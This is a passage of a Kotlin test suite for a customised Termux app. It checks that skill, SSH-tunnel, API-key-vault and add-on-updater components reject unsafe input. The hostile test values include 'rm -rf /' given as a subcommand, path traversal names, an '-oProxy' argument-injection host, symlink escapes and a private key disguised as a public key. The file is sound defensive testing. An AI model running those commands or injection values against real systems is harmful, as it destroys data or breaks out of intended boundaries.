        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateSkillName("../escape").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateSkillName("-bad").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateSkillName("a/b").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateSkillName("has space").isFailure)
        assertEquals("my-skills_v1.2", com.termux.custom.skills.SkillsRepoManager.validateSkillName("my-skills_v1.2").getOrThrow())

        // 3. Inspect local skills + sub-repo git + root git repo
        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-skills-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val skillsDir = java.io.File(homeDir, ".gemini/config/skills").apply { mkdirs() }

            // Root .git metadata (include decoy urlPrefix key to ensure exact 'url' key matching)
            val rootGit = java.io.File(skillsDir, ".git").apply { mkdirs() }
            java.io.File(rootGit, "HEAD").writeText("ref: refs/heads/main\n")
            java.io.File(rootGit, "config").writeText(
                """
                [core]
                    bare = false
                [remote "origin"]
                    urlPrefix = https://wrong.example/decoy.git
                    url = https://github.com/ing-melcat/my-rur-skills.git
                """.trimIndent()
            )

            // Local non-git skill
            val localSkill = java.io.File(skillsDir, "senior-auditor").apply { mkdirs() }
            java.io.File(localSkill, "SKILL.md").writeText("# Senior Auditor\n")

            // Sub-repo git skill
            val gitSkill = java.io.File(skillsDir, "robotics-skills").apply { mkdirs() }
            java.io.File(gitSkill, "SKILL.md").writeText("# Robotics Skills\n")
            val subGit = java.io.File(gitSkill, ".git").apply { mkdirs() }
            java.io.File(subGit, "HEAD").writeText("ref: refs/heads/dev\n")
            java.io.File(subGit, "config").writeText(
                """
                [remote "origin"]
                    url = git@github.com:ing-melcat/robotics-skills.git
                """.trimIndent()
            )

            val manager = com.termux.custom.skills.SkillsRepoManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
            )

            val state = manager.inspectSkills()
            assertTrue(state.isRootGitRepo)
            assertEquals("main", state.rootBranch)
            assertEquals("https://github.com/ing-melcat/my-rur-skills.git", state.rootRemoteUrl)
            assertEquals(2, state.totalCount)
            assertEquals(2, state.gitReposCount) // root + robotics-skills

            val robotics = state.skills.first { it.name == "robotics-skills" }
            assertTrue(robotics.hasSkillMd)
            assertTrue(robotics.isGitRepo)
            assertEquals("dev", robotics.branch)
            assertEquals("git@github.com:ing-melcat/robotics-skills.git", robotics.remoteUrl)

            val auditor = state.skills.first { it.name == "senior-auditor" }
            assertTrue(auditor.hasSkillMd)
            assertFalse(auditor.isGitRepo)

            // 4. Static zero-interpolation PTY execve argv
            val repoUrl = "https://github.com/ing-melcat/skills.git"
            val (shBin, argv) = manager.buildSkillsPtyExec("add", listOf(repoUrl, "my-skills"))
            assertTrue(shBin.endsWith("/bin/sh"))
            assertEquals("-c", argv[0])
            assertFalse("User URL must never be interpolated into sh script body", argv[1].contains(repoUrl))
            assertFalse("Prefix path must never be interpolated into sh script body", argv[1].contains(tempRoot.name))
            assertEquals("rur-skills", argv[2])
            assertEquals("skills", argv[7])
            assertEquals("add", argv[8])
            assertEquals(repoUrl, argv[9])
            assertEquals("my-skills", argv[10])

            // Reject invalid subcommand
            val badSub = runCatching { manager.buildSkillsPtyExec("rm -rf /") }
            assertTrue(badSub.isFailure)
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `SshDevicesManager v1_2 validates local port forwards, startup command, ssh-copy-id wrapper, and JSON persistence`() = runTest(testDispatcher) {
        // 1. Tunnel parser accepts valid local:remote and local:host:remote specs (non-root localPort 1024..65535)
        val parsed = com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("11434:11434, 8888:localhost:8888 3000:127.0.0.1:80")
        assertEquals(3, parsed.size)
        assertEquals(11434, parsed[0].localPort)
        assertEquals("127.0.0.1", parsed[0].remoteHost)
        assertEquals(11434, parsed[0].remotePort)
        assertEquals("localhost", parsed[1].remoteHost)
        assertEquals(80, parsed[2].remotePort)

        // Reject invalid/privileged local ports (<1024), duplicate local ports, >6 tunnels, leading dash remote host, traversal
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("0:80") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("80:80") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("70000:80") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("8080:80, 8080:90") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("2001:1 2002:2 2003:3 2004:4 2005:5 2006:6 2007:7") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("8080:-oProxy:80") }.isFailure)
        assertTrue(runCatching { com.termux.custom.ssh.SshDevicesManager.parseLocalPortForwards("8080:bad..host:80") }.isFailure)

        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-ssh-v12-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val binDir = java.io.File(prefixDir, "bin").apply { mkdirs() }
            java.io.File(binDir, "ssh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "ssh-copy-id").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "sh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "login").apply { writeText("#!/bin/sh\n"); setExecutable(true) }

            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val sshDir = java.io.File(homeDir, ".ssh").apply { mkdirs() }
            java.io.File(sshDir, "id_ed25519.pub").writeText("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMelcatV12TestKey rur-workstation\n")

            val manager = com.termux.custom.ssh.SshDevicesManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
                tcpProber = { _, _, _ -> 12L },
                tailscaleIpDetector = { "100.64.0.10" },
            )

            // 2. Persist tunnels & startup command atomically and reload
            val saved = manager.upsertDevice(
                id = null,
                name = "Jetson Orin",
                host = "100.64.9.5",
                port = 2222,
                username = "melcat",
                transport = com.termux.custom.ssh.SshTransport.TAILSCALE,
                identityFile = "",
                tags = "ros2, ollama",
                localPortForwards = "11434:11434, 8888:localhost:8888",
                startupCommand = "tmux attach || tmux new",
            ).getOrThrow()

            val reloaded = manager.inspectEnvironmentAndDevices()
            val jetson = reloaded.devices.first { it.name == "Jetson Orin" }
            assertEquals("11434:11434, 8888:localhost:8888", jetson.localPortForwards)
            assertEquals("tmux attach || tmux new", jetson.startupCommand)

            // 3. Verify buildSshArgv emits loopback-bound -L tunnels, -t, --, host, and startup command
            val sshArgv = manager.buildSshArgv(jetson)
            assertTrue(sshArgv.contains("-L"))
            assertTrue(sshArgv.contains("127.0.0.1:11434:127.0.0.1:11434"))
            assertTrue(sshArgv.contains("127.0.0.1:8888:localhost:8888"))
            val ddIdx = sshArgv.indexOf("--")
            assertTrue(ddIdx > 0)
            assertTrue("Must pass -t before -- when startupCommand is set", sshArgv.indexOf("-t") in 0 until ddIdx)
            assertEquals("100.64.9.5", sshArgv[ddIdx + 1])
            assertEquals("tmux attach || tmux new", sshArgv[ddIdx + 2])

            // 4. Verify buildCopyIdPtyExec is 100% static (zero interpolation) & uses -o User=... -- host
            val (shBin, copyArgv) = manager.buildCopyIdPtyExec(jetson)
            assertTrue(shBin.endsWith("/bin/sh"))
            assertEquals("-c", copyArgv[0])
            assertFalse("Host must never be interpolated into copy-id wrapper", copyArgv[1].contains("100.64.9.5"))
            assertFalse("Prefix must never be interpolated into copy-id wrapper", copyArgv[1].contains(tempRoot.name))
            assertEquals("rur-copy-id", copyArgv[2])
            assertTrue(copyArgv.contains("User=melcat"))
            val copyDd = copyArgv.indexOf("--")
            assertTrue(copyDd > 0)
            assertEquals("100.64.9.5", copyArgv[copyDd + 1])

            // 5. Explicit identityFile with missing .pub MUST fail instead of silently pushing id_ed25519.pub (P1-3)
            val customKeyDevice = jetson.copy(identityFile = "jetson_custom_key")
            assertTrue(runCatching { manager.buildCopyIdPtyExec(customKeyDevice) }.isFailure)

            // 6. Symlinked .pub escaping ~/.ssh/ AND PEM private key masquerading as .pub must both be rejected
            val outsideSecret = java.io.File(tempRoot, "secret.pub").apply { writeText("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOutsideSecret\n") }
            val evilPubLink = java.io.File(sshDir, "evil.pub")
            java.nio.file.Files.createSymbolicLink(evilPubLink.toPath(), outsideSecret.toPath())
            val evilDevice = jetson.copy(identityFile = "evil")
            assertTrue(runCatching { manager.buildCopyIdPtyExec(evilDevice) }.isFailure)

            // Replace id_ed25519.pub with PEM private key -> readDefaultPublicKey must return null (clipboard protection)
            java.io.File(sshDir, "id_ed25519.pub").writeText("-----BEGIN OPENSSH PRIVATE KEY-----\nSECRET\n")
            val afterPem = manager.inspectEnvironmentAndDevices()
            assertEquals(null, afterPem.defaultPublicKey)
            assertTrue(saved.devices.isNotEmpty())
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `SkillsRepoManager v1_2 reads, atomically writes SKILL_md, rejects live and dangling symlink escapes and enforces 128KB cap`() = runTest(testDispatcher) {
        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-skills-editor-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val skillsDir = java.io.File(homeDir, ".gemini/config/skills").apply { mkdirs() }
            val manager = com.termux.custom.skills.SkillsRepoManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
            )

            // 1. Missing SKILL.md returns starter template with valid YAML frontmatter
            val template = manager.readSkillMarkdown("ros2-helper").getOrThrow()
            assertTrue(template.contains("name: ros2-helper"))
            assertTrue(template.startsWith("---\n"))

            // 2. Atomic write normalizes CRLF -> LF and round-trips UTF-8
            val markdown = "---\r\nname: ros2-helper\r\ndescription: ROS 2 Humble helper\r\n---\r\n# ROS 2\r\nUsa `colcon build`.\r\n"
            assertTrue(manager.saveSkillMarkdown("ros2-helper", markdown).isSuccess)
            val readBack = manager.readSkillMarkdown("ros2-helper").getOrThrow()
            assertFalse(readBack.contains("\r"))
            assertTrue(readBack.contains("Usa `colcon build`."))

            // 3. Reject traversal and > 128 KB payload
            assertTrue(manager.readSkillMarkdown("../escape").isFailure)
            assertTrue(manager.saveSkillMarkdown("../escape", "pwn").isFailure)
            val oversized = "a".repeat(131_073)
            assertTrue(manager.saveSkillMarkdown("ros2-helper", oversized).isFailure)

            // 4. Reject symlinked skill directory pointing outside skillsDir
            val outsideDir = java.io.File(tempRoot, "outside-skill").apply {
                mkdirs()
                java.io.File(this, "SKILL.md").writeText("outside secret")
            }
            java.nio.file.Files.createSymbolicLink(
                java.io.File(skillsDir, "linked-dir").toPath(),
                outsideDir.toPath(),
            )
            assertTrue(manager.readSkillMarkdown("linked-dir").isFailure)
            assertTrue(manager.saveSkillMarkdown("linked-dir", "overwrite").isFailure)

            // 5. Reject live symlinked SKILL.md inside a regular skill directory
            val normalDir = java.io.File(skillsDir, "linked-file-skill").apply { mkdirs() }
            val outsideFile = java.io.File(tempRoot, "outside.md").apply { writeText("secret") }
            java.nio.file.Files.createSymbolicLink(
                java.io.File(normalDir, "SKILL.md").toPath(),
                outsideFile.toPath(),
            )
            assertTrue(manager.readSkillMarkdown("linked-file-skill").isFailure)
            assertTrue(manager.saveSkillMarkdown("linked-file-skill", "overwrite").isFailure)
            assertEquals("secret", outsideFile.readText())

            // 6. Reject DANGLING symlink SKILL.md -> must fail both read and write without creating target (P1-1)
            val danglingDir = java.io.File(skillsDir, "dangling-skill").apply { mkdirs() }
            val nonexistentTarget = java.io.File(tempRoot, "never-create.md")
            java.nio.file.Files.createSymbolicLink(
                java.io.File(danglingDir, "SKILL.md").toPath(),
                nonexistentTarget.toPath(),
            )
            assertTrue(manager.readSkillMarkdown("dangling-skill").isFailure)
            assertTrue(manager.saveSkillMarkdown("dangling-skill", "pwn").isFailure)
            assertFalse(nonexistentTarget.exists())
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `CodingAgentsManager v1_2 locks DeepSeek, Anthropic, and OpenAI keys in 0600 vault with zero plaintext secrets in opencode_json`() = runTest(testDispatcher) {
        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-v12-providers-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val manager = com.termux.custom.agents.CodingAgentsManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
            )

            // Catalog presets exist for all 3 new direct providers
            assertTrue(com.termux.custom.agents.CodingModelCatalog.presetsFor(com.termux.custom.agents.CodingProvider.DEEPSEEK).isNotEmpty())
            assertTrue(com.termux.custom.agents.CodingModelCatalog.presetsFor(com.termux.custom.agents.CodingProvider.ANTHROPIC).isNotEmpty())
            assertTrue(com.termux.custom.agents.CodingModelCatalog.presetsFor(com.termux.custom.agents.CodingProvider.OPENAI).isNotEmpty())

            val dsSecret = "sk-deepseek-v12-secret-99999"
            val claudeSecret = "sk-ant-api03-v12-secret-88888"
            val oaiSecret = "sk-proj-openai-v12-secret-77777"

            manager.saveProviderApiKey(com.termux.custom.agents.CodingProvider.DEEPSEEK, dsSecret).getOrThrow()
            manager.saveProviderApiKey(com.termux.custom.agents.CodingProvider.ANTHROPIC, claudeSecret).getOrThrow()
            val finalState = manager.saveProviderApiKey(com.termux.custom.agents.CodingProvider.OPENAI, oaiSecret).getOrThrow()

            assertTrue(finalState.isProviderReady(com.termux.custom.agents.CodingProvider.DEEPSEEK))
            assertTrue(finalState.isProviderReady(com.termux.custom.agents.CodingProvider.ANTHROPIC))
            assertTrue(finalState.isProviderReady(com.termux.custom.agents.CodingProvider.OPENAI))

            // Verify zero plaintext keys in opencode.json, only {file:...} references
            val opencodeJson = java.io.File(homeDir, ".config/opencode/opencode.json").readText()
            assertFalse(opencodeJson.contains(dsSecret))
            assertFalse(opencodeJson.contains(claudeSecret))
            assertFalse(opencodeJson.contains(oaiSecret))
            assertTrue(opencodeJson.contains("{file:~/.config/melcat/vault/deepseek.key}"))
            assertTrue(opencodeJson.contains("{file:~/.config/melcat/vault/anthropic.key}"))
            assertTrue(opencodeJson.contains("{file:~/.config/melcat/vault/openai.key}"))

            // Verify providers.env exports all 3 env vars for CLI agents (claude, opencode, etc.)
            val providersEnv = java.io.File(homeDir, ".config/melcat/vault/providers.env").readText()
            assertTrue(providersEnv.contains("export DEEPSEEK_API_KEY="))
            assertTrue(providersEnv.contains("export ANTHROPIC_API_KEY="))
            assertTrue(providersEnv.contains("export OPENAI_API_KEY="))

            // Verify selecting a Claude direct preset updates active model
            val claudePreset = com.termux.custom.agents.CodingModelCatalog.findById("anthropic/claude-sonnet-4-5")!!
            val afterSelect = manager.selectCodingModel(claudePreset).getOrThrow()
            assertEquals("anthropic/claude-sonnet-4-5", afterSelect.activeOpenCodeModel)

            // Clear DeepSeek key and confirm removal from opencode.json and providers.env
            val afterClear = manager.clearProviderApiKey(com.termux.custom.agents.CodingProvider.DEEPSEEK)
            assertFalse(afterClear.isProviderReady(com.termux.custom.agents.CodingProvider.DEEPSEEK))
            assertFalse(java.io.File(homeDir, ".config/melcat/vault/providers.env").readText().contains("DEEPSEEK_API_KEY"))
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    @Suppress("DEPRECATION")
    fun `GitHubReleaseUpdater v1_2 detects conflicting Termux add-ons sharing sharedUserId with mismatched certificates and ignores non-shared add-ons`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        assertTrue(GitHubReleaseUpdater.KNOWN_TERMUX_ADDONS.containsKey("com.termux.api"))
        assertTrue(GitHubReleaseUpdater.KNOWN_TERMUX_ADDONS.containsKey("com.termux.x11"))

        val shadowPm = org.robolectric.Shadows.shadowOf(context.packageManager)

        // Register our own package with sharedUserId="com.termux" and cert A
        val ownSig = android.content.pm.Signature(ByteArray(32) { 0x11 })
        val ownPkg = android.content.pm.PackageInfo().apply {
            packageName = context.packageName
            sharedUserId = "com.termux"
            signatures = arrayOf(ownSig)
            applicationInfo = android.content.pm.ApplicationInfo().apply {
                packageName = context.packageName
            }
        }
        shadowPm.installPackage(ownPkg)

        // Install com.termux.api sharing sharedUserId="com.termux" with mismatched cert B -> MUST be flagged
        val mismatchSig = android.content.pm.Signature(ByteArray(32) { 0x22 })
        val apiPkg = android.content.pm.PackageInfo().apply {
            packageName = "com.termux.api"
            sharedUserId = "com.termux"
            signatures = arrayOf(mismatchSig)
            applicationInfo = android.content.pm.ApplicationInfo().apply {
                packageName = "com.termux.api"
                nonLocalizedLabel = "Termux:API"
            }
        }
        shadowPm.installPackage(apiPkg)

        // Install com.termux.styling sharing sharedUserId="com.termux" with matching cert A -> MUST NOT be flagged
        val matchingPkg = android.content.pm.PackageInfo().apply {
            packageName = "com.termux.styling"
            sharedUserId = "com.termux"
            signatures = arrayOf(ownSig)
            applicationInfo = android.content.pm.ApplicationInfo().apply {
                packageName = "com.termux.styling"
                nonLocalizedLabel = "Termux:Styling"
            }
        }
        shadowPm.installPackage(matchingPkg)

        // Install com.termux.x11 with mismatched cert B but NO sharedUserId -> MUST NOT be false-positived (P1-2)
        val x11Pkg = android.content.pm.PackageInfo().apply {
            packageName = "com.termux.x11"
            sharedUserId = null
            signatures = arrayOf(mismatchSig)
            applicationInfo = android.content.pm.ApplicationInfo().apply {
                packageName = "com.termux.x11"
                nonLocalizedLabel = "Termux:X11"
            }
        }
        shadowPm.installPackage(x11Pkg)

        val conflicts = GitHubReleaseUpdater.detectConflictingTermuxAddons(context)
        assertEquals(1, conflicts.size)
        assertEquals("com.termux.api", conflicts.first().packageName)
        assertEquals("Termux:API", conflicts.first().label)

        // Non-allowlisted package must be rejected by openAddonUninstall
        val updater = GitHubReleaseUpdater(context, currentTag = "v1.2", ioDispatcher = testDispatcher)
        assertFalse(updater.openAddonUninstall(context, "com.android.settings"))
    }
}



